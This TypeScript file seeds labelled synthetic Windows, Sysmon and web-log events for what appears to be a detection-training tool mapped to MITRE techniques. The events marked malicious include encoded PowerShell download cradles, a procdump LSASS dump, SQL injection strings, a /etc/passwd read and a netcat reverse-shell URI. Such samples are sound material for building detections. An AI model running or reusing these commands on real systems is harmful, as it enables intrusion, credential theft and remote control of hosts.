import type { SecurityEvent, Dataset } from "@/types";

let eid = 0;
function ev(category: string, isMalicious: boolean, fields: Record<string, string>): SecurityEvent {
  eid += 1;
  const ts = new Date(2025, 6, 25, 9, Math.floor(eid % 60), eid % 60).toISOString();
  return { id: `EVT-${String(eid).padStart(4, "0")}`, timestamp: ts, category, is_malicious: isMalicious, ...fields };
}

// ===== Windows Security Logs (NIST-style: realistic benign noise + targeted malicious) =====
const windowsEvents: SecurityEvent[] = [
  // --- 4688 Process Creation: malicious encoded PowerShell ---
  ev("process_creation", true, { EventID: "4688", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA", User: "CORP\\svc-sql", ParentImage: "C:\\Windows\\System32\\services.exe" }),
  ev("process_creation", true, { EventID: "4688", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA", User: "CORP\\svc-backup", ParentImage: "C:\\Windows\\System32\\services.exe" }),
  // --- 4688 benign PowerShell (noise that should NOT match) ---
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -Command Get-Process", User: "CORP\\jdoe", ParentImage: "C:\\Windows\\explorer.exe" }),
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -Command Get-Service | Where-Object {$_.Status -eq 'Running'}", User: "CORP\\admin", ParentImage: "C:\\Windows\\explorer.exe" }),
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", User: "CORP\\svc-backup", ParentImage: "C:\\Windows\\System32\\services.exe" }),
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Windows\\System32\\notepad.exe", CommandLine: "notepad.exe", User: "CORP\\jdoe", ParentImage: "C:\\Windows\\explorer.exe" }),
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Program Files\\Microsoft Office\\WINWORD.EXE", CommandLine: "WINWORD.EXE /n", User: "CORP\\jdoe", ParentImage: "C:\\Windows\\explorer.exe" }),
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Windows\\System32\\cmd.exe", CommandLine: "cmd.exe /c dir C:\\Users", User: "CORP\\admin", ParentImage: "C:\\Windows\\explorer.exe" }),
  // --- 4688 malicious rundll32 ---
  ev("process_creation", true, { EventID: "4688", Image: "C:\\Windows\\System32\\rundll32.exe", CommandLine: "rundll32.exe C:\\Users\\Public\\payload.dll,Start", User: "CORP\\admin", ParentImage: "C:\\Windows\\System32\\cmd.exe" }),
  // --- 4625 Failed logon (brute force / PtH attempts) ---
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "Administrator", IpAddress: "185.220.101.45", FailureReason: "%%2313" }),
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "Administrator", IpAddress: "185.220.101.45", FailureReason: "%%2313" }),
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "svc-backup", IpAddress: "185.220.101.45", FailureReason: "%%2313" }),
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "Administrator", IpAddress: "45.133.1.22", FailureReason: "%%2313" }),
  // --- 4624 benign logons ---
  ev("logon", false, { EventID: "4624", LogonType: "2", TargetUserName: "jdoe", IpAddress: "10.0.0.55", AuthenticationPackageName: "Negotiate", LogonProcessName: "User32" }),
  ev("logon", false, { EventID: "4624", LogonType: "3", TargetUserName: "CORP$", IpAddress: "10.0.0.12", AuthenticationPackageName: "Kerberos", LogonProcessName: "Kerberos" }),
  ev("logon", false, { EventID: "4624", LogonType: "2", TargetUserName: "admin", IpAddress: "10.0.0.60", AuthenticationPackageName: "Negotiate", LogonProcessName: "User32" }),
  // --- 4624 malicious PtH (LogonType 9 + NTLM) ---
  ev("logon", true, { EventID: "4624", LogonType: "9", TargetUserName: "svc-backup", IpAddress: "10.0.0.99", AuthenticationPackageName: "NTLM", LogonProcessName: "NtLmSsp" }),
  ev("logon", true, { EventID: "4624", LogonType: "9", TargetUserName: "svc-sql", IpAddress: "10.0.0.99", AuthenticationPackageName: "NTLM", LogonProcessName: "NtLmSsp" }),
  // --- 4698 Scheduled task: malicious ---
  ev("scheduled_task", true, { EventID: "4698", TaskName: "\\Microsoft\\Windows\\WindowsUpdate\\UpdateHelper", Action: "powershell.exe -w hidden -enc SQBFAFgA", Creator: "CORP\\svc-sql" }),
  ev("scheduled_task", true, { EventID: "4698", TaskName: "\\Microsoft\\Windows\\Defender\\UpdateSignatures", Action: "powershell.exe -nop -w hidden -enc RABvAHcAbgBsAG8AYQBkAC4A", Creator: "CORP\\svc-backup" }),
  // --- 4698 benign scheduled tasks ---
  ev("scheduled_task", false, { EventID: "4698", TaskName: "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", Action: "%systemroot%\\system32\\defrag.exe", Creator: "SYSTEM" }),
  ev("scheduled_task", false, { EventID: "4698", TaskName: "\\Microsoft\\Windows\\WindowsUpdate\\AUScheduledInstall", Action: "UsoClient.exe StartInstall", Creator: "SYSTEM" }),
  ev("scheduled_task", false, { EventID: "4698", TaskName: "\\Microsoft\\Windows\\Active Directory Rights Management Services Client\\AD RMS Rights Policy Template Management", Action: "%systemroot%\\system32\\rmsro.exe -T", Creator: "SYSTEM" }),
  // --- 7045 Service install: malicious ---
  ev("service_install", true, { EventID: "7045", ServiceName: "SvcHostUpdate", ServiceType: "User Mode Service", ServiceStartType: "Auto", ServiceFileName: "C:\\Users\\Public\\svc.exe" }),
  // --- 7045 benign service installs ---
  ev("service_install", false, { EventID: "7045", ServiceName: "MicrosoftEdgeUpdate", ServiceType: "Own Process", ServiceStartType: "Manual", ServiceFileName: '"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"' }),
  ev("service_install", false, { EventID: "7045", ServiceName: "Sysmon", ServiceType: "Kernel Mode Driver", ServiceStartType: "Auto", ServiceFileName: "C:\\Windows\\System32\\drivers\\sysmondrv.sys" }),
];

// ===== Sysmon logs =====
const sysmonEvents: SecurityEvent[] = [
  // --- EID 1 Process creation: malicious encoded PowerShell ---
  ev("process_creation", true, { EventID: "1", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA", ParentImage: "C:\\Windows\\System32\\services.exe", User: "NT AUTHORITY\\SYSTEM", Hashes: "SHA256=ab12cd34ef56" }),
  ev("process_creation", true, { EventID: "1", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -EncodedCommand RABvAHcAbgBsAG8AYQBkAC4AZQB4AGUA", ParentImage: "C:\\Windows\\System32\\cmd.exe", User: "CORP\\svc-sql", Hashes: "SHA256=ef78ab90cd12" }),
  // --- EID 1 benign process creation ---
  ev("process_creation", false, { EventID: "1", Image: "C:\\Windows\\System32\\notepad.exe", CommandLine: "notepad.exe", ParentImage: "C:\\Windows\\explorer.exe", User: "CORP\\jdoe", Hashes: "SHA256=ff99ee77dd66" }),
  ev("process_creation", false, { EventID: "1", Image: "C:\\Windows\\System32\\svchost.exe", CommandLine: "C:\\Windows\\System32\\svchost.exe -k netsvcs", ParentImage: "C:\\Windows\\System32\\services.exe", User: "NT AUTHORITY\\SYSTEM", Hashes: "SHA256=aabbccdd1122" }),
  ev("process_creation", false, { EventID: "1", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -Command Get-WmiObject Win32_Process", ParentImage: "C:\\Windows\\explorer.exe", User: "CORP\\admin", Hashes: "SHA256=112233445566" }),
  // --- EID 1 malicious LSASS access ---
  ev("process_creation", true, { EventID: "1", Image: "C:\\Windows\\System32\\lsass.exe", CommandLine: "C:\\Windows\\System32\\lsass.exe", ParentImage: "C:\\Windows\\System32\\procdump.exe", User: "NT AUTHORITY\\SYSTEM", GrantedAccess: "0x1410", Hashes: "SHA256=00deadbeef00" }),
  ev("process_creation", true, { EventID: "1", Image: "C:\\Windows\\System32\\procdump.exe", CommandLine: "procdump.exe -accepteula -ma lsass.exe lsass.dmp", ParentImage: "C:\\Windows\\System32\\cmd.exe", User: "CORP\\admin", GrantedAccess: "0x1ffff", Hashes: "SHA256=deadbeef00ff" }),
  // --- EID 3 network: malicious C2 ---
  ev("network_connection", true, { EventID: "3", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", DestinationIp: "185.220.101.45", DestinationPort: "4444", Protocol: "tcp", User: "CORP\\svc-sql" }),
  ev("network_connection", true, { EventID: "3", Image: "C:\\Windows\\System32\\rundll32.exe", DestinationIp: "45.133.1.22", DestinationPort: "8080", Protocol: "tcp", User: "CORP\\admin" }),
  // --- EID 3 benign network ---
  ev("network_connection", false, { EventID: "3", Image: "C:\\Program Files\\Mozilla Firefox\\firefox.exe", DestinationIp: "104.16.123.96", DestinationPort: "443", Protocol: "tcp", User: "CORP\\jdoe" }),
  ev("network_connection", false, { EventID: "3", Image: "C:\\Windows\\System32\\svchost.exe", DestinationIp: "23.45.67.89", DestinationPort: "53", Protocol: "udp", User: "NT AUTHORITY\\SYSTEM" }),
  // --- EID 11 file creation ---
  ev("file_creation", true, { EventID: "11", TargetFilename: "C:\\Users\\Public\\payload.dll", Image: "C:\\Windows\\System32\\rundll32.exe", User: "CORP\\admin" }),
  ev("file_creation", false, { EventID: "11", TargetFilename: "C:\\Users\\jdoe\\Documents\\report.docx", Image: "C:\\Program Files\\Microsoft Office\\WINWORD.EXE", User: "CORP\\jdoe" }),
  ev("file_creation", false, { EventID: "11", TargetFilename: "C:\\Windows\\Temp\\setup.log", Image: "C:\\Windows\\System32\\msiexec.exe", User: "NT AUTHORITY\\SYSTEM" }),
];

// ===== Web Access Logs =====
const webEvents: SecurityEvent[] = [
  // --- Malicious SQLi ---
  ev("web_access", true, { EventID: "HTTP", Method: "GET", Uri: "/products?id=1' OR '1'='1", ClientIP: "45.133.1.22", StatusCode: "200", UserAgent: "sqlmap/1.7" }),
  ev("web_access", true, { EventID: "HTTP", Method: "GET", Uri: "/search?q=;cat /etc/passwd", ClientIP: "45.133.1.22", StatusCode: "200", UserAgent: "curl/7.81.0" }),
  ev("web_access", true, { EventID: "HTTP", Method: "POST", Uri: "/api/login", ClientIP: "92.118.170.55", StatusCode: "200", Body: "admin' OR '1'='1'--", UserAgent: "python-requests/2.28" }),
  ev("web_access", true, { EventID: "HTTP", Method: "GET", Uri: "/products?id=1 UNION SELECT username,password FROM users--", ClientIP: "45.133.1.22", StatusCode: "200", UserAgent: "sqlmap/1.7" }),
  ev("web_access", true, { EventID: "HTTP", Method: "GET", Uri: "/?cmd=| nc 185.220.101.45 4444 -e /bin/sh", ClientIP: "45.133.1.22", StatusCode: "500", UserAgent: "Mozilla/5.0" }),
  // --- Benign web traffic ---
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/products?id=42", ClientIP: "10.0.0.55", StatusCode: "200", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/index.html", ClientIP: "10.0.0.55", StatusCode: "200", UserAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/about", ClientIP: "10.0.0.60", StatusCode: "200", UserAgent: "Mozilla/5.0 (X11; Linux x86_64)" }),
  ev("web_access", false, { EventID: "HTTP", Method: "POST", Uri: "/api/login", ClientIP: "10.0.0.55", StatusCode: "302", Body: "username=jdoe&password=****", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/products?category=electronics&page=2", ClientIP: "10.0.0.60", StatusCode: "200", UserAgent: "Mozilla/5.0 (X11; Linux x86_64)" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/css/style.css", ClientIP: "10.0.0.55", StatusCode: "200", UserAgent: "Mozilla/5.0" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/api/products?limit=20", ClientIP: "172.16.0.12", StatusCode: "200", UserAgent: "Go-http-client/1.1" }),
];

export const SEED_DATASETS: Omit<Dataset, "id" | "created_at">[] = [
  {
    name: "Windows Security Event Logs — Process & Logon Events",
    category: "Windows Security",
    source_type: "Windows Event Log",
    description: "Curated Windows Security event log dataset covering process creation (4688), logon success/failure (4624/4625), scheduled task creation (4698), and service install (7045). Contains benign and malicious events modeled on NIST attack patterns.",
    event_count: windowsEvents.length,
    malicious_count: windowsEvents.filter((e) => e.is_malicious).length,
    benign_count: windowsEvents.filter((e) => !e.is_malicious).length,
    events: windowsEvents,
  },
  {
    name: "Sysmon — Process, Network & File Activity",
    category: "Sysmon",
    source_type: "Sysmon",
    description: "Sysmon EID 1 (process creation), EID 3 (network connection), and EID 11 (file creation) events. Includes encoded PowerShell, LSASS access, and C2 beaconing patterns.",
    event_count: sysmonEvents.length,
    malicious_count: sysmonEvents.filter((e) => e.is_malicious).length,
    benign_count: sysmonEvents.filter((e) => !e.is_malicious).length,
    events: sysmonEvents,
  },
  {
    name: "Web Access Logs — Injection & Suspicious Requests",
    category: "Web Access",
    source_type: "HTTP",
    description: "Web server access logs containing SQL injection, command injection, and suspicious requests alongside normal traffic.",
    event_count: webEvents.length,
    malicious_count: webEvents.filter((e) => e.is_malicious).length,
    benign_count: webEvents.filter((e) => !e.is_malicious).length,
    events: webEvents,
  },
];

export function eventsForChallenge(mitreId: string): SecurityEvent[] {
  switch (mitreId) {
    case "T1059.001": {
      // Encoded PowerShell: process_creation events from both Windows + Sysmon
      const win = windowsEvents.filter((e) => e.category === "process_creation");
      const sys = sysmonEvents.filter((e) => e.category === "process_creation");
      return [...win, ...sys];
    }
    case "T1003": {
      // LSASS access: Sysmon process_creation events
      return sysmonEvents.filter((e) => e.category === "process_creation");
    }
    case "T1053":
      // Scheduled task creation
      return windowsEvents.filter((e) => e.category === "scheduled_task");
    case "T1550":
      // Pass-the-Hash: all logon events (4624 + 4625)
      return windowsEvents.filter((e) => e.category === "logon");
    case "T1190":
      // SQL injection: all web access logs
      return webEvents;
    default:
      return windowsEvents;
  }
}
